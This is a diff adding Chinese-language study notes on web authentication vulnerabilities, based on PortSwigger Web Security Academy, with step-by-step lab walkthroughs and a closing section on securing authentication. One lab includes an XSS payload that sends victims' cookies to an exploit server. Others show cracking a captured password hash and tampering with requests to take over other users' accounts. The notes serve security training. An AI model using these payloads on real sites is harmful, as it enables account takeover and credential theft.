@@ -660,6 +660,244 @@ HTTP 基本驗證對於工作階段相關的漏洞也特別脆弱，尤其是 CS
 
 如果使用者首先被提示輸入密碼，然後在另一個頁面上被提示輸入驗證碼，那麼使用者在輸入驗證碼之前實際上已經處於「已登入」狀態。在這種情況下，值得測試是否可以在完成第一個驗證步驟後直接跳到「僅限已登入」的頁面。偶爾，您會發現網站在載入頁面之前實際上並未檢查您是否完成了第二個步驟。
 
+::: tip Lab: [2FA simple bypass](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass)
+
+1. 使用 victim 的帳號密碼登入，提示需輸入 4 位數驗證碼。
+2. 直接存取路徑 `/my-account` 成功繞過驗證碼並登入完成此 Lab。
+:::
+
+### 有缺陷的雙重要素驗證邏輯
+
+有時，雙重要素驗證中的邏輯缺陷意味著在使用者完成初始登入步驟後，網站並未充分驗證完成第二個步驟的是同一位使用者。
+
+例如，使用者在第一步驟中使用其正常憑證登入，如下所示：
+
+```http
+POST /login-steps/first HTTP/1.1
+Host: vulnerable-website.com
+...
+username=carlos&password=qwerty
+```
+
+然後，他們會被指派一個與其帳戶相關的 Cookie，接著被帶到登入流程的第二步驟：
+
+```http
+HTTP/1.1 200 OK
+Set-Cookie: account=carlos
+
+GET /login-steps/second HTTP/1.1
+Cookie: account=carlos
+```
+
+當提交驗證碼時，請求會使用這個 Cookie 來決定使用者試圖存取的帳戶：
+
+```http
+POST /login-steps/second HTTP/1.1
+Host: vulnerable-website.com
+Cookie: account=carlos
+...
+verification-code=123456
+```
+
+在這種情況下，攻擊者可以使用自己的憑證登入，但在提交驗證碼時將 `account` Cookie 的值變更為任意使用者名稱。
+
+```http
+POST /login-steps/second HTTP/1.1
+Host: vulnerable-website.com
+Cookie: account=victim-user
+...
+verification-code=123456
+```
+
+如果攻擊者接著能夠暴力破解驗證碼，這將極其危險，因為這將允許他們完全基於使用者名稱登入任意使用者的帳戶。他們甚至不需要知道使用者的密碼。
+
+::: tip Lab: [2FA broken logic](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic)
+
+這個 Lab 要破解 4 位數 2FA 驗證碼，我需要好心人贊助 Pro。
+:::
+
+### 暴力破解 2FA 驗證碼
+
+就像密碼一樣，網站需要採取措施防止 2FA 驗證碼遭到暴力破解。這特別重要，因為驗證碼通常只是簡單的 4 位數或 6 位數數字。如果沒有足夠的暴力破解防護，破解這種驗證碼是輕而易舉的。
+
+有些網站試圖透過在使用者輸入一定數量的錯誤驗證碼時自動將其登出來防止這種情況。這在實務上是無效的，因為進階攻擊者甚至可以透過為 Burp Intruder 建立巨集來自動化這個多步驟過程。Turbo Intruder 擴充功能也可以用於此目的。
+
+::: tip Lab: [2FA bypass using a brute-force attack](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack)
+
+Brute-force 2FA again. I need Burp Suite Pro.
+:::
+
+## 其他驗證機制中的漏洞
+
+除了基本的登入功能外，大多數網站提供額外功能讓使用者管理其帳戶。例如，使用者通常可以變更密碼或在忘記密碼時重設密碼。這些機制也可能引入可被攻擊者利用的漏洞。
+
+網站通常會小心避免在其登入頁面出現知名漏洞。但很容易忽略的是，您需要採取類似步驟來確保相關功能同樣強固。這在攻擊者能夠建立自己的帳戶，因而可以輕易存取並研究這些額外頁面的情況下特別重要。
+
+### 保持使用者登入狀態
+
+一個常見功能是即使在關閉瀏覽器工作階段後仍保持登入狀態的選項。這通常是一個簡單的核取方塊，標示為「記住我」或「保持我的登入狀態」之類。
+
+這個功能通常透過產生某種「記住我」權杖來實作，然後將其儲存在持續性 Cookie 中。由於擁有這個 Cookie 實際上允許您繞過整個登入程序，因此最佳做法是讓這個 Cookie 難以猜測。然而，有些網站基於靜態值的可預測串聯（如使用者名稱和時間戳記）來產生此 Cookie。有些甚至使用密碼作為 Cookie 的一部分。如果攻擊者能夠建立自己的帳戶，這種方法特別危險，因為他們可以研究自己的 Cookie 並可能推斷出其產生方式。一旦他們找出公式，就可以嘗試暴力破解其他使用者的 Cookie 來取得對其帳戶的存取權限。
+
+有些網站認為如果 Cookie 以某種方式加密，即使確實使用了靜態值，也不會被猜到。雖然如果正確執行可能確實如此，但使用簡單的雙向編碼（如 Base64）來天真地「加密」Cookie 完全不提供任何保護。即使使用帶有單向雜湊函數的適當加密也不是完全無懈可擊的。如果攻擊者能夠輕易識別雜湊演算法，且未使用鹽值，他們可能透過簡單地雜湊其字典檔來暴力破解 Cookie。如果對 Cookie 猜測沒有套用類似限制，這種方法可以用來繞過登入嘗試限制。
+
+::: tip Lab: [Brute-forcing a stay-logged-in cookie](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)
+
+1. 使用 wiener 登入後如果選擇「Stay logged in」，在 Cookie 中會有一個 `stay-logged-in`，他是一個 base64 編碼，解碼後會是 `wiener:{一串 MD5 hash}`，該 hash 為密碼的 hash 值。
+2. 接著觀察若存取 `/my-account`，並且 `stay-logged-in` 的驗證是正確的，會回應狀態碼 200，反之則為 302（記得把 Cookie 的 `session` 刪掉）。
+3. 使用 Intruder 破解出 Payload 完成此 Lab，附上 Intruder 的設定截圖。
+    ![alt](src/image10.png)
+:::
+
+即使攻擊者無法建立自己的帳戶，他們仍可能利用這個漏洞。使用常見技術（如 XSS），攻擊者可以竊取其他使用者的「記住我」Cookie，並從中推斷出 Cookie 的建構方式。如果網站是使用開源框架建構的，Cookie 建構的關鍵細節甚至可能有公開文件記錄。
+
+在某些罕見情況下，即使密碼經過雜湊處理，也可能從 Cookie 中取得使用者的實際明文密碼。知名密碼清單的雜湊版本可以在網路上取得，因此如果使用者的密碼出現在這些清單中的其中一個，解密雜湊有時可能簡單到只需要將雜湊貼到搜尋引擎中。這證明了鹽值在有效加密中的重要性。
+
+::: tip Lab: [Offline password cracking](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)
+
+1. 貼文留言的地方存在 XSS。
+2. 留言以下 Payload 取得 carlos 的 Cookie
+    ```http
+    <script>document.location='https://your-exploit-id.exploit-server.net/'+document.cookie</script>
+    ```
+3. 前往 Access log 查看取得 carlos 的 Cookie：
+    ```http
+    secret=YjOFBT63CYQsOGg8OCJEo9vRKcYPbBtT;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
+    ```
+4. 將 `stay-logged-in` 的值經過 base64 decode 後取得 carlos 的密碼 Hash：`26323c16d5f4dabff3bb136f2460a943`
+5. 經過 [Hash Crack](https://crackstation.net/) 後，取得 carlos 的密碼：`onceuponatime`
+6. 使用 carlos 的帳號密碼登入並刪除帳號完成此 Lab。
+:::
+
+### 重設使用者密碼
+
+實際上，有些使用者會忘記密碼，因此通常會有讓他們重設密碼的方式。由於在這種情況下顯然無法使用一般的密碼驗證，網站必須依賴替代方法來確保是真正的使用者在重設自己的密碼。基於這個原因，密碼重設功能本質上是危險的，需要安全地實作。
+
+這個功能有幾種常見的實作方式，具有不同程度的漏洞。
+
+#### 透過電子郵件發送密碼
+
+不用說，如果網站一開始就安全地處理密碼，那麼向使用者發送其當前密碼應該永遠不可能。相反地，有些網站會產生新密碼並透過電子郵件將其發送給使用者。
+
+一般來說，應該避免透過不安全管道發送持久性密碼。在這種情況下，安全性依賴於產生的密碼在非常短的時間後過期，或使用者立即再次變更密碼。否則，這種方法極容易受到中間人攻擊。
+
+考量到收件匣既是持久性的，且並非真正設計用於機密資訊的安全儲存，電子郵件通常也不被認為是安全的。許多使用者還會透過不安全管道在多個裝置之間自動同步其收件匣。
+
+#### 使用 URL 重設密碼
+
+一個更強固的密碼重設方法是向使用者發送獨特的 URL，將他們帶到密碼重設頁面。這種方法較不安全的實作會使用帶有容易猜測參數的 URL 來識別正在重設的帳戶，例如：
+
+```url
+http://vulnerable-website.com/reset-password?user=victim-user
+```
+
+在這個例子中，攻擊者可以將 `user` 參數變更為他們已識別的任何使用者名稱。然後他們會直接被帶到一個可能為此任意使用者設定新密碼的頁面。
+
+這個過程更好的實作是產生高熵、難以猜測的權杖，並基於該權杖建立重設 URL。在最佳情況下，此 URL 應該不提供任何關於正在重設哪個使用者密碼的提示。
+
+```url
+http://vulnerable-website.com/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8
+```
+
+當使用者造訪此 URL 時，系統應該檢查此權杖是否存在於後端，如果是，它應該重設哪個使用者的密碼。這個權杖應該在短時間後過期，並在密碼重設後立即銷毀。
+
+然而，有些網站在提交重設表單時也未能再次驗證權杖。在這種情況下，攻擊者可以簡單地從自己的帳戶造訪重設表單，刪除權杖，並利用這個頁面來重設任意使用者的密碼。
+
+::: tip [Lab: Password reset broken logic](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic)
+
+1. 這是更新密碼的請求：
+    ```http
+    POST /forgot-password?temp-forgot-password-token=qxt1pa53szvrz2gzkf37ioz6wyuyzrbj HTTP/2
+    Host: 0ae3002a035f4353a2811a98001b0002.web-security-academy.net
+    Cookie: session=P37cBgRtNRbqpehR8Zltn9kngfqIkXEr
+    Content-Length: 117
+    Cache-Control: max-age=0
+    Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
+    Sec-Ch-Ua-Mobile: ?0
+    Sec-Ch-Ua-Platform: "macOS"
+    Accept-Language: en-US,en;q=0.9
+    Origin: https://0ae3002a035f4353a2811a98001b0002.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-User: ?1
+    Sec-Fetch-Dest: document
+    Referer: https://0ae3002a035f4353a2811a98001b0002.web-security-academy.net/forgot-password?temp-forgot-password-token=qxt1pa53szvrz2gzkf37ioz6wyuyzrbj
+    Accept-Encoding: gzip, deflate, br
+    Priority: u=0, i
+
+    temp-forgot-password-token=qxt1pa53szvrz2gzkf37ioz6wyuyzrbj&username=wiener&new-password-1=peter&new-password-2=peter
+    ```
+2. 嘗試將 `username` 更改為 `carlos` 並請求，就成功修改 `carlos` 的密碼了。
+3. 使用帳號密碼 `carlos`/`peter` 登入完成此 Lab。
+:::
+
+如果重設電子郵件中的 URL 是動態產生的，這也可能容易受到密碼重設毒化攻擊。在這種情況下，攻擊者可能竊取其他使用者的權杖並用它來變更他們的密碼。
+
+::: tip Lab: [Password reset poisoning via middleware](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-poisoning-via-middleware)
+
+1. 這是一個忘記密碼的請求：
+    ```http
+    POST /forgot-password HTTP/2
+    Host: 0a4b00100365cd8d84b5a42400690075.web-security-academy.net
+    Cookie: session=8dnBx3nVI2SWWE3ITK9Ry4hRB2AeDr2z
+    Content-Length: 15
+    Cache-Control: max-age=0
+    Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
+    Sec-Ch-Ua-Mobile: ?0
+    Sec-Ch-Ua-Platform: "macOS"
+    Accept-Language: en-US,en;q=0.9
+    Origin: https://0a4b00100365cd8d84b5a42400690075.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Upgrade-Insecure-Requests: 1
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+    Sec-Fetch-Site: same-origin
+    Sec-Fetch-Mode: navigate
+    Sec-Fetch-User: ?1
+    Sec-Fetch-Dest: document
+    Referer: https://0a4b00100365cd8d84b5a42400690075.web-security-academy.net/forgot-password
+    Accept-Encoding: gzip, deflate, br
+    Priority: u=0, i
+
+    username=wiener
+    ```
+2. 在其中加入 `X-Forwarded-Host` 的 Header，並將忘記密碼的使用者改成 `carlos`：
+    ```http
+    X-Forwarded-Host: exploit-0aa0009c0316cd8f845da3bb01a20045.exploit-server.net
+    ```
+3. 在 Access log 中看到包含 token 的請求
+4. 存取 `https://your-lab-ID.web-security-academy.net/` + Access log 中的 URL 路徑、參數，即可修改 carlos 的密碼。
+5. 修改密碼後登入 `carlos` 使用者完成此 Lab。
+:::
+
+::: info Read more
+
+[Password reset poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning)
+:::
+
+### 變更使用者密碼
+
+通常，變更密碼涉及輸入您目前的密碼，然後輸入兩次新密碼。這些頁面基本上依賴與一般登入頁面相同的程序來檢查使用者名稱和目前密碼是否相符。因此，這些頁面可能容易受到相同技術的攻擊。
+
+如果密碼變更功能允許攻擊者在未以受害使用者身分登入的情況下直接存取，則可能特別危險。例如，如果使用者名稱是在隱藏欄位中提供，攻擊者可能能夠在請求中編輯此值來針對任意使用者。這可能被利用來列舉使用者名稱和暴力破解密碼。
+
+::: tip [Lab: Password brute-force via password change](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change)
+
+1. 觀察修改密碼的請求
+    | Current password 是否正確 | New password 和 Confirm new password 是否匹配 | Response |
+    | --- | --- | --- |
+    | ✅ | ❌ | New passwords do not match |
+    | ❌ | ❌ | Current password is incorrect |
+    | ✅ | ✅ | 302 |
+    | ❌ | ✅ | 302 |
+2. 我們可以透過輸入不匹配的新密碼，在 Current password 欄位使用字典檔破解取得密碼。可透過回應長度或使用 Intruder 的 Grep - Extract 判斷回應（記得將 username 改成 `carlos`）。
+3. 最後成功取得 carlos 的密碼為 `tigger`。使用取得的密碼登入使用者 carlos 完成此 Lab。
+:::
+
 ## 第三方身分驗證機制的漏洞
 
 如果你很喜歡破解身分驗證機制並且已經完成所有身分驗證的題目，你可能會像嘗試 OAuth 身分驗證的 Labs。
@@ -672,7 +910,48 @@ HTTP 基本驗證對於工作階段相關的漏洞也特別脆弱，尤其是 CS
 
 我們已經展示了網站因實施身份驗證的方式而可能存在漏洞的幾種方式。為了降低你自己的網站遭受此類攻擊的風險，應該嘗試遵守幾項原則。
 
-::: info Read more
+驗證是一個複雜的主題，正如我們所展示的，不幸的是弱點和缺陷很容易潛入其中。概述您可以採取的每一種可能措施來保護自己的網站顯然是不可能的。然而，有幾個一般原則是您應該始終遵循的。
 
-* [如何使身分驗證機制安全](https://portswigger.net/web-security/authentication/securing)
-:::
+### 謹慎處理使用者憑證
+
+即使是最強固的驗證機制，如果您無意中向攻擊者洩露了一組有效的登入憑證，也會變得無效。不用說，您永遠不應該透過未加密的連線發送任何登入資料。雖然您可能已經為登入請求實作了 HTTPS，但請確保透過將任何嘗試的 HTTP 請求重新導向至 HTTPS 來強制執行此措施。
+
+您還應該稽核您的網站，確保沒有使用者名稱或電子郵件位址透過公開存取的個人檔案或反映在 HTTP 回應中而被洩露。
+
+### 不要依賴使用者來確保安全
+
+嚴格的驗證措施通常需要使用者付出一些額外努力。人性使得某些使用者不可避免地會尋找方法來省去這些努力。因此，您需要盡可能強制執行安全行為。
+
+最明顯的例子是實作有效的密碼原則。一些較傳統的原則會失敗，因為人們會將自己可預測的密碼硬塞進原則中。相反地，實作某種簡單的密碼檢查器可能更有效，它允許使用者試驗密碼並即時提供關於密碼強度的回饋。一個熱門的例子是由 Dropbox 開發的 JavaScript 程式庫 zxcvbn。透過只允許被密碼檢查器評為高分的密碼，您可以比使用傳統原則更有效地強制使用安全密碼。
+
+### 防止使用者名稱列舉
+
+如果您透露使用者存在於系統中，攻擊者就會更容易破解您的驗證機制。甚至在某些情況下，由於網站的性質，知道特定人員擁有帳戶本身就是敏感資訊。
+
+無論嘗試的使用者名稱是否有效，使用相同的通用錯誤訊息都很重要，並確保它們真的相同。您應該始終為每個登入請求回傳相同的 HTTP 狀態碼，最後，讓不同情況下的回應時間盡可能無法區分。
+
+### 實作強固的暴力破解防護
+
+考量到建構暴力破解攻擊是多麼簡單，確保您採取步驟來防止或至少干擾任何暴力破解登入的嘗試是至關重要的。
+
+較有效的方法之一是實作嚴格的、基於 IP 的使用者速率限制。這應該包括防止攻擊者操縱其表面 IP 位址的措施。理想情況下，在達到特定限制後，您應該要求使用者在每次登入嘗試時完成驗證碼測試。
+
+請記住，這不能保證完全消除暴力破解的威脅。然而，讓過程盡可能繁瑣和需要手動操作，會增加任何潛在攻擊者放棄並尋找更容易目標的可能性。
+
+### 三重檢查您的驗證邏輯
+
+正如我們的實驗所展示的，簡單的邏輯缺陷很容易潛入程式碼中，在驗證的情況下，這有可能完全危害您的網站和使用者。徹底稽核任何驗證或確認邏輯以消除缺陷，是強固驗證的絕對關鍵。一個可以被繞過的檢查，最終並不比沒有檢查好多少。
+
+### 不要忘記補充功能
+
+務必不要只專注於核心登入頁面而忽略與驗證相關的額外功能。這在攻擊者可以自由註冊自己的帳戶並探索此功能的情況下特別重要。請記住，密碼重設或變更與主要登入機制一樣是有效的攻擊面，因此必須同樣強固。
+
+### 實作適當的多重要素驗證
+
+雖然多重要素驗證可能不適用於每個網站，但如果正確執行，它比僅基於密碼的登入要安全得多。請記住，驗證同一要素的多個實例並非真正的多重要素驗證。透過電子郵件發送驗證碼本質上只是更冗長的單一要素驗證形式。
+
+基於 SMS 的 2FA 在技術上是驗證兩個要素（您知道的和您擁有的）。然而，透過 SIM 卡調換等方式被濫用的可能性意味著這個系統可能不可靠。
+
+理想情況下，2FA 應該使用直接產生驗證碼的專用裝置或應用程式來實作。由於它們是專為提供安全性而設計的，這些通常更安全。
+
+最後，就像主要驗證邏輯一樣，請確保您 2FA 檢查中的邏輯是健全的，這樣就不能輕易被繞過。
